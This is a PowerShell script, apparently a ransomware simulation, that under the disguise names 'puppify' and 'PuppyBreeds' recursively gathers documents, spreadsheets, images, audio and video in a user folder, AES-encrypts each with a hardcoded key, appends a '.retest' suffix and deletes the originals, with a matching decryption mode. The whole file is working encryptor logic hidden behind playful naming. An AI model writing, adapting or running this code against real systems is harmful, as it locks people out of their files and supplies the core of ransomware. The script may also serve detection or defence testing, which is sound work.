
param(
    [string]$Mode,
    [string]$FolderPath = "C:\Users\retest2\Pictures\",
    [string]$LastName = ".retest",
    [string]$Callsign = "QRkpt21jo2Lu6wn82hlY9k8xUj5KyUrJOPIC9da41jg=",
    [int]$DelayInMilliseconds = 0  # Default to no delay
)

$PuppyBreeds = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'

ipmo ".\FileCryptography.psm1"

# Validate folder path
if (-not (Test-Path $FolderPath)) {
    Write-Host "The specified folder path does not exist: $FolderPath" -ForegroundColor Red
    exit
}

if ($Mode -eq "puppify") {
    # Gather all files from the folder path and its subdirectories
    $FilesToPuppify = Get-ChildItem -Include $PuppyBreeds -Recurse -Force -Path "$FolderPath*" -Exclude *$LastName | Where-Object { -not $_.PSIsContainer }
    $NumPuppies = $FilesToPuppify.Length

    Write-Host "Found $NumPuppies files to puppify in folder: $FolderPath"

    # Puppify the files
    foreach ($puppy in $FilesToPuppify) {
        Write-Host "Puppifying $($puppy.FullName)"
        Protect-File $puppy -KeyAsPlainText $Callsign -Suffix $LastName -Algorithm AES -RemoveSource
        Start-Sleep -Milliseconds $DelayInMilliseconds
    }
    Write-Host "Puppified $NumPuppies files in folder: $FolderPath"
}

elseif ($Mode -eq "depuppify") {
    # Gather all files from the folder path and its subdirectories
    $FilesToDepuppify = Get-ChildItem -Path "$FolderPath*" -Include *$LastName -Recurse -Force | Where-Object { -not $_.PSIsContainer }
    $NumPuppies = $FilesToDepuppify.Length

    Write-Host "Found $NumPuppies files to depuppify in folder: $FolderPath"

    # Depuppify the files
    foreach ($puppy in $FilesToDepuppify) {
        Write-Host "Depuppyfing $($puppy.FullName)"
        Unprotect-File $puppy -KeyAsPlainText $Callsign -Suffix $LastName -Algorithm AES -RemoveSource
        Start-Sleep -Milliseconds $DelayInMilliseconds
    }
    Write-Host "Depuppified $NumPuppies files in folder: $FolderPath"
}

else {
    Write-Host "You must specify a valid mode: 'puppify' or 'depuppify'" -ForegroundColor Red
}
exit
